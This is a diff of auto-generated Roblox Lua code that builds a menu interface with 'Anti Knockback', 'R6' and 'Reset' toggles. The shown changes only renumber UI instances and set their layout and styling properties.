+G2L["174"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["174"]["Name"] = [[button]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.UIPadding
+G2L["175"] = Instance.new("UIPadding", G2L["174"]);
+G2L["175"]["PaddingTop"] = UDim.new(0, 3);
+G2L["175"]["PaddingRight"] = UDim.new(0, 3);
+G2L["175"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["175"]["PaddingBottom"] = UDim.new(0, 3);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame
+G2L["176"] = Instance.new("Frame", G2L["174"]);
+G2L["176"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["176"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["176"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["176"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["176"]["Name"] = [[toggleFrame]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame.outlineStroke
+G2L["177"] = Instance.new("UIStroke", G2L["176"]);
+G2L["177"]["Thickness"] = 2;
+G2L["177"]["Name"] = [[outlineStroke]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame.toggleFade
+G2L["178"] = Instance.new("CanvasGroup", G2L["176"]);
+G2L["178"]["BorderSizePixel"] = 0;
+G2L["178"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["178"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["178"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["178"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["178"]["Name"] = [[toggleFade]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.button.toggleFrame.toggleFade.UIGradient
+G2L["179"] = Instance.new("UIGradient", G2L["178"]);
+G2L["179"]["Rotation"] = 90;
+G2L["179"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.text
+G2L["17a"] = Instance.new("TextLabel", G2L["173"]);
+G2L["17a"]["TextWrapped"] = true;
+G2L["17a"]["ZIndex"] = 10;
+G2L["17a"]["BorderSizePixel"] = 0;
+G2L["17a"]["TextSize"] = 14;
+G2L["17a"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["17a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17a"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["17a"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17a"]["BackgroundTransparency"] = 1;
+G2L["17a"]["Size"] = UDim2.new(0, 155, 0, 20);
+G2L["17a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17a"]["Text"] = [[Anti Knockback]];
+G2L["17a"]["Name"] = [[text]];
+G2L["17a"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.text.UIPadding
+G2L["17b"] = Instance.new("UIPadding", G2L["17a"]);
+G2L["17b"]["PaddingLeft"] = UDim.new(0, 5);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.text.text
+G2L["17c"] = Instance.new("UIStroke", G2L["17a"]);
+G2L["17c"]["Name"] = [[text]];
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.knockback.UIPadding
+G2L["17d"] = Instance.new("UIPadding", G2L["173"]);
+G2L["17d"]["PaddingLeft"] = UDim.new(0, 2);
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======
+G2L["17e"] = Instance.new("Frame", G2L["122"]);
+G2L["17e"]["BorderSizePixel"] = 0;
+G2L["17e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17e"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["17e"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["17e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17e"]["Name"] = [[======TITLE======]];
+G2L["17e"]["LayoutOrder"] = 1;
+G2L["17e"]["BackgroundTransparency"] = 1;
+
+
+-- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======.text
+G2L["17f"] = Instance.new("TextLabel", G2L["17e"]);
+G2L["17f"]["TextWrapped"] = true;
+G2L["17f"]["BorderSizePixel"] = 0;
+G2L["17f"]["TextSize"] = 14;
+G2L["17f"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["17f"]["TextTransparency"] = 0.3;
+G2L["17f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17f"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["17f"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["17f"]["BackgroundTransparency"] = 1;
+G2L["17f"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["17f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["17f"]["Text"] = [[Anti]];
+G2L["17f"]["Name"] = [[text]];
+G2L["17f"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======.text.text
-G2L["152"] = Instance.new("UIStroke", G2L["151"]);
-G2L["152"]["Name"] = [[text]];
+G2L["180"] = Instance.new("UIStroke", G2L["17f"]);
+G2L["180"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.rightside.antiTab.======TITLE======.text.UIPadding
-G2L["153"] = Instance.new("UIPadding", G2L["151"]);
-G2L["153"]["PaddingLeft"] = UDim.new(0, 1);
+G2L["181"] = Instance.new("UIPadding", G2L["17f"]);
+G2L["181"]["PaddingLeft"] = UDim.new(0, 1);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside
-G2L["154"] = Instance.new("Frame", G2L["f1"]);
-G2L["154"]["BorderSizePixel"] = 0;
-G2L["154"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["154"]["Size"] = UDim2.new(0, 176, 0, 255);
-G2L["154"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
-G2L["154"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["154"]["Name"] = [[leftside]];
-G2L["154"]["BackgroundTransparency"] = 1;
+G2L["182"] = Instance.new("Frame", G2L["11f"]);
+G2L["182"]["BorderSizePixel"] = 0;
+G2L["182"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["182"]["Size"] = UDim2.new(0, 176, 0, 255);
+G2L["182"]["Position"] = UDim2.new(-0.00038, 0, 0, 0);
+G2L["182"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["182"]["Name"] = [[leftside]];
+G2L["182"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.UIListLayout
-G2L["155"] = Instance.new("UIListLayout", G2L["154"]);
-G2L["155"]["Padding"] = UDim.new(0, 5);
-G2L["155"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+G2L["183"] = Instance.new("UIListLayout", G2L["182"]);
+G2L["183"]["Padding"] = UDim.new(0, 5);
+G2L["183"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab
-G2L["156"] = Instance.new("Frame", G2L["154"]);
-G2L["156"]["BorderSizePixel"] = 0;
-G2L["156"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
-G2L["156"]["Size"] = UDim2.new(0, 176, 0, 160);
-G2L["156"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["156"]["Name"] = [[characterTab]];
+G2L["184"] = Instance.new("Frame", G2L["182"]);
+G2L["184"]["BorderSizePixel"] = 0;
+G2L["184"]["BackgroundColor3"] = Color3.fromRGB(11, 11, 11);
+G2L["184"]["Size"] = UDim2.new(0, 176, 0, 160);
+G2L["184"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["184"]["Name"] = [[characterTab]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.characterScript
-G2L["157"] = Instance.new("LocalScript", G2L["156"]);
-G2L["157"]["Name"] = [[characterScript]];
+G2L["185"] = Instance.new("LocalScript", G2L["184"]);
+G2L["185"]["Name"] = [[characterScript]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.UIListLayout
-G2L["158"] = Instance.new("UIListLayout", G2L["156"]);
-G2L["158"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
-G2L["158"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
+G2L["186"] = Instance.new("UIListLayout", G2L["184"]);
+G2L["186"]["HorizontalFlex"] = Enum.UIFlexAlignment.Fill;
+G2L["186"]["SortOrder"] = Enum.SortOrder.LayoutOrder;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.greystroke
-G2L["159"] = Instance.new("UIStroke", G2L["156"]);
-G2L["159"]["ZIndex"] = 99;
-G2L["159"]["Color"] = Color3.fromRGB(51, 51, 51);
-G2L["159"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
-G2L["159"]["Name"] = [[greystroke]];
-G2L["159"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
+G2L["187"] = Instance.new("UIStroke", G2L["184"]);
+G2L["187"]["ZIndex"] = 99;
+G2L["187"]["Color"] = Color3.fromRGB(51, 51, 51);
+G2L["187"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
+G2L["187"]["Name"] = [[greystroke]];
+G2L["187"]["BorderStrokePosition"] = Enum.BorderStrokePosition.Inner;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======ACCENT======
-G2L["15a"] = Instance.new("Frame", G2L["156"]);
-G2L["15a"]["BorderSizePixel"] = 0;
-G2L["15a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["15a"]["Size"] = UDim2.new(1, 0, 0, 4);
-G2L["15a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["15a"]["Name"] = [[======ACCENT======]];
-G2L["15a"]["BackgroundTransparency"] = 1;
+G2L["188"] = Instance.new("Frame", G2L["184"]);
+G2L["188"]["BorderSizePixel"] = 0;
+G2L["188"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["188"]["Size"] = UDim2.new(1, 0, 0, 4);
+G2L["188"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["188"]["Name"] = [[======ACCENT======]];
+G2L["188"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======ACCENT======.GuiColor
-G2L["15b"] = Instance.new("Frame", G2L["15a"]);
-G2L["15b"]["BorderSizePixel"] = 0;
-G2L["15b"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
-G2L["15b"]["Size"] = UDim2.new(1, -2, 0, 2);
-G2L["15b"]["Position"] = UDim2.new(0, 1, 0, 1);
-G2L["15b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["15b"]["Name"] = [[GuiColor]];
+G2L["189"] = Instance.new("Frame", G2L["188"]);
+G2L["189"]["BorderSizePixel"] = 0;
+G2L["189"]["BackgroundColor3"] = Color3.fromRGB(0, 124, 255);
+G2L["189"]["Size"] = UDim2.new(1, -2, 0, 2);
+G2L["189"]["Position"] = UDim2.new(0, 1, 0, 1);
+G2L["189"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["189"]["Name"] = [[GuiColor]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======ACCENT======.GuiColor.UICorner
-G2L["15c"] = Instance.new("UICorner", G2L["15b"]);
+G2L["18a"] = Instance.new("UICorner", G2L["189"]);
 
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======
-G2L["15d"] = Instance.new("Frame", G2L["156"]);
-G2L["15d"]["BorderSizePixel"] = 0;
-G2L["15d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["15d"]["Size"] = UDim2.new(1, 0, 0, 15);
-G2L["15d"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["15d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["15d"]["Name"] = [[======TITLE======]];
-G2L["15d"]["LayoutOrder"] = 1;
-G2L["15d"]["BackgroundTransparency"] = 1;
+G2L["18b"] = Instance.new("Frame", G2L["184"]);
+G2L["18b"]["BorderSizePixel"] = 0;
+G2L["18b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["18b"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["18b"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["18b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["18b"]["Name"] = [[======TITLE======]];
+G2L["18b"]["LayoutOrder"] = 1;
+G2L["18b"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======.text
-G2L["15e"] = Instance.new("TextLabel", G2L["15d"]);
-G2L["15e"]["TextWrapped"] = true;
-G2L["15e"]["BorderSizePixel"] = 0;
-G2L["15e"]["TextSize"] = 14;
-G2L["15e"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["15e"]["TextTransparency"] = 0.3;
-G2L["15e"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["15e"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["15e"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["15e"]["BackgroundTransparency"] = 1;
-G2L["15e"]["Size"] = UDim2.new(1, 0, 0, 15);
-G2L["15e"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["15e"]["Text"] = [[Character]];
-G2L["15e"]["Name"] = [[text]];
-G2L["15e"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
+G2L["18c"] = Instance.new("TextLabel", G2L["18b"]);
+G2L["18c"]["TextWrapped"] = true;
+G2L["18c"]["BorderSizePixel"] = 0;
+G2L["18c"]["TextSize"] = 14;
+G2L["18c"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["18c"]["TextTransparency"] = 0.3;
+G2L["18c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["18c"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["18c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["18c"]["BackgroundTransparency"] = 1;
+G2L["18c"]["Size"] = UDim2.new(1, 0, 0, 15);
+G2L["18c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["18c"]["Text"] = [[Character]];
+G2L["18c"]["Name"] = [[text]];
+G2L["18c"]["Position"] = UDim2.new(0.02273, 0, 0, 0);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======.text.text
-G2L["15f"] = Instance.new("UIStroke", G2L["15e"]);
-G2L["15f"]["Name"] = [[text]];
+G2L["18d"] = Instance.new("UIStroke", G2L["18c"]);
+G2L["18d"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.======TITLE======.text.UIPadding
-G2L["160"] = Instance.new("UIPadding", G2L["15e"]);
-G2L["160"]["PaddingLeft"] = UDim.new(0, 1);
+G2L["18e"] = Instance.new("UIPadding", G2L["18c"]);
+G2L["18e"]["PaddingLeft"] = UDim.new(0, 1);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6
-G2L["161"] = Instance.new("Frame", G2L["156"]);
-G2L["161"]["BorderSizePixel"] = 0;
-G2L["161"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["161"]["Size"] = UDim2.new(1, 0, 0, 20);
-G2L["161"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["161"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["161"]["Name"] = [[R6]];
-G2L["161"]["LayoutOrder"] = 2;
-G2L["161"]["BackgroundTransparency"] = 1;
+G2L["18f"] = Instance.new("Frame", G2L["184"]);
+G2L["18f"]["BorderSizePixel"] = 0;
+G2L["18f"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["18f"]["Size"] = UDim2.new(1, 0, 0, 20);
+G2L["18f"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["18f"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["18f"]["Name"] = [[R6]];
+G2L["18f"]["LayoutOrder"] = 2;
+G2L["18f"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button
-G2L["162"] = Instance.new("TextButton", G2L["161"]);
-G2L["162"]["BorderSizePixel"] = 0;
-G2L["162"]["TextTransparency"] = 1;
-G2L["162"]["TextSize"] = 14;
-G2L["162"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["162"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["162"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["162"]["ZIndex"] = 50;
-G2L["162"]["BackgroundTransparency"] = 1;
-G2L["162"]["Size"] = UDim2.new(0, 20, 0, 20);
-G2L["162"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["162"]["Name"] = [[button]];
+G2L["190"] = Instance.new("TextButton", G2L["18f"]);
+G2L["190"]["BorderSizePixel"] = 0;
+G2L["190"]["TextTransparency"] = 1;
+G2L["190"]["TextSize"] = 14;
+G2L["190"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["190"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["190"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["190"]["ZIndex"] = 50;
+G2L["190"]["BackgroundTransparency"] = 1;
+G2L["190"]["Size"] = UDim2.new(0, 20, 0, 20);
+G2L["190"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["190"]["Name"] = [[button]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.UIPadding
-G2L["163"] = Instance.new("UIPadding", G2L["162"]);
-G2L["163"]["PaddingTop"] = UDim.new(0, 3);
-G2L["163"]["PaddingRight"] = UDim.new(0, 3);
-G2L["163"]["PaddingLeft"] = UDim.new(0, 3);
-G2L["163"]["PaddingBottom"] = UDim.new(0, 3);
+G2L["191"] = Instance.new("UIPadding", G2L["190"]);
+G2L["191"]["PaddingTop"] = UDim.new(0, 3);
+G2L["191"]["PaddingRight"] = UDim.new(0, 3);
+G2L["191"]["PaddingLeft"] = UDim.new(0, 3);
+G2L["191"]["PaddingBottom"] = UDim.new(0, 3);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.toggleFrame
-G2L["164"] = Instance.new("Frame", G2L["162"]);
-G2L["164"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
-G2L["164"]["BorderMode"] = Enum.BorderMode.Inset;
-G2L["164"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["164"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
-G2L["164"]["Name"] = [[toggleFrame]];
+G2L["192"] = Instance.new("Frame", G2L["190"]);
+G2L["192"]["BackgroundColor3"] = Color3.fromRGB(21, 21, 21);
+G2L["192"]["BorderMode"] = Enum.BorderMode.Inset;
+G2L["192"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["192"]["BorderColor3"] = Color3.fromRGB(51, 51, 51);
+G2L["192"]["Name"] = [[toggleFrame]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.toggleFrame.outlineStroke
-G2L["165"] = Instance.new("UIStroke", G2L["164"]);
-G2L["165"]["Thickness"] = 2;
-G2L["165"]["Name"] = [[outlineStroke]];
+G2L["193"] = Instance.new("UIStroke", G2L["192"]);
+G2L["193"]["Thickness"] = 2;
+G2L["193"]["Name"] = [[outlineStroke]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.toggleFrame.toggleFade
-G2L["166"] = Instance.new("CanvasGroup", G2L["164"]);
-G2L["166"]["BorderSizePixel"] = 0;
-G2L["166"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["166"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["166"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["166"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["166"]["Name"] = [[toggleFade]];
+G2L["194"] = Instance.new("CanvasGroup", G2L["192"]);
+G2L["194"]["BorderSizePixel"] = 0;
+G2L["194"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["194"]["GroupColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["194"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["194"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["194"]["Name"] = [[toggleFade]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.button.toggleFrame.toggleFade.UIGradient
-G2L["167"] = Instance.new("UIGradient", G2L["166"]);
-G2L["167"]["Rotation"] = 90;
-G2L["167"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
+G2L["195"] = Instance.new("UIGradient", G2L["194"]);
+G2L["195"]["Rotation"] = 90;
+G2L["195"]["Transparency"] = NumberSequence.new{NumberSequenceKeypoint.new(0.000, 1),NumberSequenceKeypoint.new(1.000, 0.7)};
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.text
-G2L["168"] = Instance.new("TextLabel", G2L["161"]);
-G2L["168"]["TextWrapped"] = true;
-G2L["168"]["ZIndex"] = 10;
-G2L["168"]["BorderSizePixel"] = 0;
-G2L["168"]["TextSize"] = 14;
-G2L["168"]["TextXAlignment"] = Enum.TextXAlignment.Left;
-G2L["168"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["168"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["168"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["168"]["BackgroundTransparency"] = 1;
-G2L["168"]["Size"] = UDim2.new(0, 155, 0, 20);
-G2L["168"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["168"]["Text"] = [[R6]];
-G2L["168"]["Name"] = [[text]];
-G2L["168"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
+G2L["196"] = Instance.new("TextLabel", G2L["18f"]);
+G2L["196"]["TextWrapped"] = true;
+G2L["196"]["ZIndex"] = 10;
+G2L["196"]["BorderSizePixel"] = 0;
+G2L["196"]["TextSize"] = 14;
+G2L["196"]["TextXAlignment"] = Enum.TextXAlignment.Left;
+G2L["196"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["196"]["FontFace"] = Font.new([[rbxasset://fonts/families/Inconsolata.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["196"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["196"]["BackgroundTransparency"] = 1;
+G2L["196"]["Size"] = UDim2.new(0, 155, 0, 20);
+G2L["196"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["196"]["Text"] = [[R6]];
+G2L["196"]["Name"] = [[text]];
+G2L["196"]["Position"] = UDim2.new(0.10227, 0, 0, 0);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.text.UIPadding
-G2L["169"] = Instance.new("UIPadding", G2L["168"]);
-G2L["169"]["PaddingLeft"] = UDim.new(0, 5);
+G2L["197"] = Instance.new("UIPadding", G2L["196"]);
+G2L["197"]["PaddingLeft"] = UDim.new(0, 5);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.text.text
-G2L["16a"] = Instance.new("UIStroke", G2L["168"]);
-G2L["16a"]["Name"] = [[text]];
+G2L["198"] = Instance.new("UIStroke", G2L["196"]);
+G2L["198"]["Name"] = [[text]];
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.R6.UIPadding
-G2L["16b"] = Instance.new("UIPadding", G2L["161"]);
-G2L["16b"]["PaddingLeft"] = UDim.new(0, 2);
+G2L["199"] = Instance.new("UIPadding", G2L["18f"]);
+G2L["199"]["PaddingLeft"] = UDim.new(0, 2);
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset
-G2L["16c"] = Instance.new("Frame", G2L["156"]);
-G2L["16c"]["BorderSizePixel"] = 0;
-G2L["16c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["16c"]["Size"] = UDim2.new(1, 0, 0, 23);
-G2L["16c"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
-G2L["16c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["16c"]["Name"] = [[Reset]];
-G2L["16c"]["LayoutOrder"] = 2;
-G2L["16c"]["BackgroundTransparency"] = 1;
+G2L["19a"] = Instance.new("Frame", G2L["184"]);
+G2L["19a"]["BorderSizePixel"] = 0;
+G2L["19a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["19a"]["Size"] = UDim2.new(1, 0, 0, 23);
+G2L["19a"]["Position"] = UDim2.new(0, 0, 0.02941, 0);
+G2L["19a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["19a"]["Name"] = [[Reset]];
+G2L["19a"]["LayoutOrder"] = 2;
+G2L["19a"]["BackgroundTransparency"] = 1;
 
 
 -- StarterGui.T5784YHRGE89ES98T.MainFrame.innerframe.contentarea.Main.leftside.characterTab.Reset.button
-G2L["16d"] = Instance.new("TextButton", G2L["16c"]);
-G2L["16d"]["BorderSizePixel"] = 0;
-G2L["16d"]["TextTransparency"] = 1;
-G2L["16d"]["TextSize"] = 14;
-G2L["16d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["16d"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-G2L["16d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
-G2L["16d"]["ZIndex"] = 49;
-G2L["16d"]["BackgroundTransparency"] = 1;
-G2L["16d"]["Size"] = UDim2.new(1, 0, 1, 0);
-G2L["16d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
-G2L["16d"]["Name"] = [[button]];
+G2L["19b"] = Instance.new("TextButton", G2L["19a"]);
+G2L["19b"]["BorderSizePixel"] = 0;
+G2L["19b"]["TextTransparency"] = 1;
+G2L["19b"]["TextSize"] = 14;
+G2L["19b"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["19b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
+G2L["19b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
+G2L["19b"]["ZIndex"] = 49;
+G2L["19b"]["BackgroundTransparency"] = 1;
+G2L["19b"]["Size"] = UDim2.new(1, 0, 1, 0);
+G2L["19b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
+G2L["19b"]["Name"] = [[button]];
 
 
